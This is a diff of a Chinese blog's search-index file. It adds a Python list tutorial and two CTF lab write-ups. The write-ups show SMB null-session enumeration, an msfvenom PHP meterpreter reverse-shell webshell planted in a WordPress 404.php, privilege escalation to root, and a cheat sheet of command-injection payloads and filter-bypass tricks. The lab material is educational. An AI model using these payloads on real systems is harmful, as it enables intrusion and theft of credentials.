@@ -74,6 +74,361 @@
       </tags>
   </entry>
   <entry>
+    <title>Python从入门到精通——2. 列表、元组、字典创建及操作</title>
+    <url>/2024/09/25/82a6c0c945c0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>序列是Python中最基本的数据结构，序列中的每个值都有对应位置上的数据值，称之为索引。<em><strong>注意：索引的第一个是0</strong></em></p>
+<p><strong>在Python中，一共有6个内置类型，其中列表和元组是最常见的类型。</strong></p>
+<hr>
+<h1 id="1-列表"><a href="#1-列表" class="headerlink" title="1. 列表"></a>1. 列表</h1><h2 id="1-1-列表是什么及其创建"><a href="#1-1-列表是什么及其创建" class="headerlink" title="1.1 列表是什么及其创建"></a>1.1 列表是什么及其创建</h2><p><strong>列表</strong>是由一系列按特定顺序排列的元素的组成。包括你不仅可以创建包含字⺟表中所有字⺟、数字 0~9 或所有家庭成员姓名的列表，还可以将任何东西加⼊列表，其中的元素之间可以没有任何关系。列表通常包含多个元素，因此给列表指定⼀个表⽰复数的名称（如 letters、digits 或 names）是个不错的主意。<br>你可以把列表理解为C语言中的数组，但是Python的列表是一个更宏观的概念，它可以包括你想到的任何数据内容。<br>Python中，列表用中括号<code>[]</code>表示，用逗号分割其中的元素（ps：这里都是指英文半角下的符号，不能用中文符号，不然就会报错）。<br>举个例子：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251541693.png"
+                      alt="image.png"
+                ><br>可以看到：Python 将打印列表的内部表⽰，<strong>包括⽅括号。</strong></p>
+<hr>
+<h2 id="1-2-列表的相关操作"><a href="#1-2-列表的相关操作" class="headerlink" title="1.2 列表的相关操作"></a>1.2 列表的相关操作</h2><h3 id="1-2-1-列表索引访问"><a href="#1-2-1-列表索引访问" class="headerlink" title="1.2.1 列表索引访问"></a>1.2.1 列表索引访问</h3><h4 id="单个索引访问"><a href="#单个索引访问" class="headerlink" title="单个索引访问"></a>单个索引访问</h4><p>列表是一个有序集合，也就是说其中的元素并不是无序的，每个元素都有自己的位置，也就是[[#前言]]说的<code>索引</code>。我们要访问列表中的某一个位置，可以直接告诉Python这个位置的索引（我们说的第n个元素或位置，其索引要减去1，也就是索引为n-1）。要访问列表元素，可以指出列表的名称加上元素索引，索引要放在中括号内。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251542461.png"
+                      alt="image.png"
+                ></p>
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<p>举个例子：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251543939.png"
+                      alt="image.png"
+                ></p>
+<p>这里有个特殊的方法，可以让你返回列表中的最后一个元素，无论列表的长度是多少，你都可以用索引<code>-1</code>来表示列表的最后一个元素，以此类推，索引<code>-2</code>用来访问倒数第二个元素……，如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251550715.png"
+                      alt="image.png"
+                ></p>
+<p><em>ps：访问的索引不能超过列表最后一个元素的索引，这样将会直接导致报错。只要列表不为空，索引<code>-1</code>来访问列表最后一个元素都有效</em></p>
+<h4 id="索引切片访问"><a href="#索引切片访问" class="headerlink" title="索引切片访问"></a>索引切片访问</h4><p>可以利用<code>[]</code>和<code>:</code>来确定一个索引范围来进行切片，就是对列表的某一段切出来进行打印。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251708866.png"
+                      alt="image.png"
+                ></p>
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<p>注意：这里<code>:</code>右边的索引是不会被取到的，如下的<code>1:4</code>,是取不到索引为4的位置的元素。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658095.png"
+                      alt="image.png"
+                ></p>
+<p>同样，也可以用负数索引来表示倒数第几个元素<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658968.png"
+                      alt="image.png"
+                ></p>
+<p>有一种特殊情况，在<code>:</code>的左右两边是可以不加索引值的，意思是直接取到头，比如<code>2:</code>，表示从索引为2的（第三个）的元素取到最后一个（包括最后一个）。在前面切片范围的<code>:</code>之后还可以添加一个<code>:</code>，表示步长，所谓步长可以理解为等差数列的公差，就是隔一个步长取一个元素。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251704005.png"
+                      alt="image.png"
+                ></p>
+<p>你也可以用标准化输出来使用列表中的值，也就是第一章的<code>f</code>标准化输出<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251643872.png"
+                      alt="image.png"
+                ></p>
+<h3 id="1-2-2-列表的修改、添加、删除"><a href="#1-2-2-列表的修改、添加、删除" class="headerlink" title="1.2.2 列表的修改、添加、删除"></a>1.2.2 列表的修改、添加、删除</h3><p>Python的列表一般是动态的，也就是你可以对其中的某些元素进行一些操作来改变列表。比如当以后你自己做一个项目的适合，你自己做了一个游戏，游戏中有一些怪物，怪物是用一个列表存储的，当你消灭了一个怪物，这个怪物就会从列表中删除，相应的，当你通过一个关卡，列表中的怪物也会进行更新。</p>
+<h4 id="列表的修改"><a href="#列表的修改" class="headerlink" title="列表的修改"></a>列表的修改</h4><p>列表的修改十分简单，只是利用赋值运算符对某个索引位置的元素进行覆盖赋值。如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251710937.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的添加和删除（更新）"><a href="#列表的添加和删除（更新）" class="headerlink" title="列表的添加和删除（更新）"></a>列表的添加和删除（更新）</h4><p>列表的添加是一个很重要的操作，你可以用来更新你的列表数据，以达到你的目标要求。</p>
+<p>首先介绍一下队列：队列是一种先进先出（FIFO）的数据结构，我们可以使用列表来实现队列的基本功能。我们都知道在一个地方排队，是要从队伍末尾开始排的（不考虑没素质的人）。这样我们列表基本的添加和删除都是在列表的末尾进行操作的</p>
+<h5 id="append-函数"><a href="#append-函数" class="headerlink" title="append()函数"></a>append()函数</h5><p><strong>函数语法：<code>list.append(obj)</code></strong><br>首先来介绍列表的内置函数，可以把一个列表看成一个队列，这个append()函数也是满足队列的条件，是在列表的末尾进行添加。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251720596.png"
+                      alt="image.png"
+                ></p>
+<h5 id="pop-函数"><a href="#pop-函数" class="headerlink" title="pop()函数"></a>pop()函数</h5><p><strong>函数语法：<code>list.pop([index=-1])</code></strong><br><em>ps：pop()的默认参数就是最后一个索引，一般不自主选择（当然也可以自己选择索引）。这里需要注意，pop()函数是有返回值的，返回值就是你选择删除的数据，可以理解为一个抽象的栈，把数据从栈里面弹出来</em><br><code>pop()</code>函数是和<code>append()</code>函数相对的，这个函数是将列表的最后一个元素删除。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251724325.png"
+                      alt="image.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251841067.png"
+                      alt="image.png"
+                ></p>
+<h5 id="insert-函数"><a href="#insert-函数" class="headerlink" title="insert()函数"></a>insert()函数</h5><p><strong>函数语法：<code>list.insert(index, obj)</code></strong><br>    <em>ps：- index – 对象 obj 需要插入的索引位置     - obj – 要插入列表中的对象。</em><br>这个函数字面意思就是插入，你可以插入数据到列表的任意一个地方，你甚至可以插入一个列表，这就是列表的嵌套。当你插入一个数据后，后面的所有数据都会向后移一个位置，也就是索引加一<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251831764.png"
+                      alt="image.png"
+                ></p>
+<h5 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h5><p><strong>语法：<code>del list[index]</code></strong><br><code>del</code><em>不是</em><code>python3</code> 中的<strong>内置函数</strong>，<code>del</code>只是一个关键字，就跟<code>import</code>和<code>return</code>一样<br>del也是可以删除列表中任意位置的数据，你只需要知道数据的索引即可<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251838748.png"
+                      alt="image.png"
+                ></p>
+<h5 id="比较del和pop"><a href="#比较del和pop" class="headerlink" title="比较del和pop()"></a>比较del和pop()</h5><p>当你想要删除数据时该如何选择呢？这个其实很简单，当你想要直接删除数据并且不想再使用这个数据时，你就可以用del语句，直接将数据清楚；当然你也可以用pop()函数，但是不用一个变量来保存这个删除的数据，也就相当于直接删除。如果你想要将数据从列表中取出来，并且要将这个数据用以其他操作，那么你就只能用pop()函数。</p>
+<h5 id="remove-函数"><a href="#remove-函数" class="headerlink" title="remove()函数"></a>remove()函数</h5><p>有时候，你不知道要从列表中删除的值在哪个位置。如果只知道要删除的元素的值，可使⽤ <code>remove()</code> ⽅法。<br><em>ps：<code>remove()</code>函数只会删除第一个满足条件的数据，也就是当找到了第一个需要删除的元素，他就停止寻找了。如果想要删除更多或者全部相同元素，就需要使用循环，这将在后面循环结构的一章进行讲解</em><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251857448.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h4><h5 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h5><p><strong>函数语法：<code>list.sort(cmp=None, key=None, reverse=False)</code></strong></p>
+<ul>
+<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
+<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
+<li>reverse – 排序规则，reverse &#x3D; True 降序， reverse &#x3D; False 升序（默认）。</li>
+</ul>
+<p>Python有一个内置函数，可以对列表轻松的进行排序。值得注意的是，<code>sort()</code>函数不止对数字进行排序，也可以对字母进行排序。如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251911202.png"
+                      alt="image.png"
+                ></p>
+<p>当然也可以对列表进行逆序，只需要加上参数<code>reverse = True</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251923030.png"
+                      alt="image.png"
+                ></p>
+<h5 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h5><p><code>sort()</code>函数使用之后，列表的顺序就会被永久改变，如果想要进行临时排序，就可以使用<code>sorted()</code>函数<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251931129.png"
+                      alt="image.png"
+                ><br>在调⽤ <code>sorted()</code> 函数后，列表元素的排列顺序并没有变<br>如果要按与字⺟顺序相反的顺序显⽰列表，也可向 <code>sorted()</code> 函数 传递参数 <code>reverse=True</code></p>
+<p><em>ps：在并⾮所有的值都是全小写的时，按字⺟顺序排列列表要复杂⼀些。在确定排列顺序时，有多种解读⼤写字⺟的⽅式，此时要指定准确的排列顺序，可能会比这⾥所做的更加复杂。然而，大多数排序方式是以本节介绍的知识为基础的。</em></p>
+<h5 id="reverse-函数"><a href="#reverse-函数" class="headerlink" title="reverse()函数"></a>reverse()函数</h5><p>要反转列表元素的排列顺序，可使⽤ reverse() ⽅法。这里是将原列表的顺序进行反转，而不是排序后反转<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251934680.png"
+                      alt="image.png"
+                ></p>
+<h4 id="列表的其他操作"><a href="#列表的其他操作" class="headerlink" title="列表的其他操作"></a>列表的其他操作</h4><h5 id="count-函数"><a href="#count-函数" class="headerlink" title="count()函数"></a>count()函数</h5><p>这个函数是用来统计列表中某个数据出现的次数的<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946234.png"
+                      alt="image.png"
+                ></p>
+<h5 id="extend-函数"><a href="#extend-函数" class="headerlink" title="extend()函数"></a>extend()函数</h5><p>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946805.png"
+                      alt="image.png"
+                ></p>
+<h5 id="index-函数"><a href="#index-函数" class="headerlink" title="index()函数"></a>index()函数</h5><p>从列表中找出某个值第一个匹配项的索引位置<br><em>ps：如果在列表中有重复元素，只会索引到目标数据第一次出现的索引位置</em><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251947793.png"
+                      alt="image.png"
+                ></p>
+<h5 id="copy-函数"><a href="#copy-函数" class="headerlink" title="copy()函数"></a>copy()函数</h5><p>将一个列表进行复制并返回该复制的列表<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251948401.png"
+                      alt="image.png"
+                ></p>
+<h5 id="clear-函数"><a href="#clear-函数" class="headerlink" title="clear()函数"></a>clear()函数</h5><p>将列表清空<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251949806.png"
+                      alt="image.png"
+                ></p>
+<h3 id="1-2-3-Python列表脚本操作符"><a href="#1-2-3-Python列表脚本操作符" class="headerlink" title="1.2.3 Python列表脚本操作符"></a>1.2.3 Python列表脚本操作符</h3><p>列表对 <code>+</code> 和 <code>*</code> 的操作符与字符串相似。<code>+</code> 号用于组合列表，<code>*</code> 号用于重复列表。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Python 表达式</th>
+<th align="left">结果</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">len([1, 2, 3])</td>
+<td align="left">3</td>
+<td align="left">列表的长度</td>
+</tr>
+<tr>
+<td align="left">[1, 2, 3] + [4, 5, 6]</td>
+<td align="left">[1, 2, 3, 4, 5, 6]</td>
+<td align="left">组合</td>
+</tr>
+<tr>
+<td align="left">[‘Hi!’] * 4</td>
+<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
+<td align="left">重复</td>
+</tr>
+<tr>
+<td align="left">3 in [1, 2, 3]</td>
+<td align="left">True</td>
+<td align="left">元素是否存在于列表中</td>
+</tr>
+<tr>
+<td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td>
+<td align="left">1 2 3</td>
+<td align="left">迭代</td>
+</tr>
+<tr>
+<td align="left">max([1, 2, 3])</td>
+<td align="left">3</td>
+<td align="left">列表中的最大值</td>
+</tr>
+<tr>
+<td align="left">min([1, 2, 3])</td>
+<td align="left">1</td>
+<td align="left">列表中的最小值</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>python</category>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SambaSMB信息泄露（Serve Message Block)</title>
+    <url>/2024/09/11/cfb8804dd1b5/</url>
+    <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
+<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
+<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
+<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
+<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
+<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
+<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
+<p>1. </p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
+<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
+<p>连接mysql</p>
+<p><code>mysql -h ip -u user -p</code></p>
+<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
+<p><code>ssh 用户名@ip</code></p>
+<p>尝试数据库密码，密码错误</p>
+</li>
+<li><p>针对SMB协议远程溢出漏洞进行分析</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
+
+<p>发现也没有漏洞</p>
+</li>
+</ol>
+<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
+<p>扫描到网站后台目录</p>
+<p>打开并输入用户名和密码</p>
+<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
+<p>我们将webshell上传到editor的404.php页面</p>
+<p>然后打开404页面</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
+
+<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+
+<p>发现获得服务器的通用权限</p>
+<p>优化终端</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>查看当前计算机的用户</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>查看敏感用户，发现一个togie</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf 基本思路</title>
+    <url>/2024/09/11/93f6ba8bb1f2/</url>
+    <content><![CDATA[<h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>在扫描的全部信息里寻找是否为http服务</p>
+</blockquote>
+<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
+<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
+<p>注意到flag.txt，打开获得flag</p>
+<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
+<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
+<p>在浏览器输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
+
+<p> 匿名登录ftp服务器根目录</p>
+<p>发现flag</p>
+<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
+<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
+
+<p>然后依次打开robots.txt中的目录</p>
+<p>发现命令执行窗口</p>
+<p>于是想到命令注入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
+</blockquote>
+<p>找到在home下的用户Summer</p>
+<p>然后利用ssh远程连接</p>
+<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
+<p>于是利用这个端口进行连接</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
+
+<p>于是得到反弹shell</p>
+<p>利用pwd ls cat more等命令</p>
+<p>查看flag</p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>common</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python从入门到精通——1 . Python介绍及语法元素基础知识（快速上手）</title>
     <url>/2024/09/23/356fe7073bf3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>“人生苦短，快用Python”</strong></em></p>
@@ -396,238 +751,11 @@
 ]]></content>
       <categories>
         <category>python</category>
+        <category>教程</category>
       </categories>
       <tags>
         <tag>python</tag>
         <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python从入门到精通——2. 列表、元组、字典创建及操作</title>
-    <url>/2024/09/25/82a6c0c945c0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>序列是Python中最基本的数据结构，序列中的每个值都有对应位置上的数据值，称之为索引。<em><strong>注意：索引的第一个是0</strong></em></p>
-<p><strong>在Python中，一共有6个内置类型，其中列表和元组是最常见的类型。</strong></p>
-<hr>
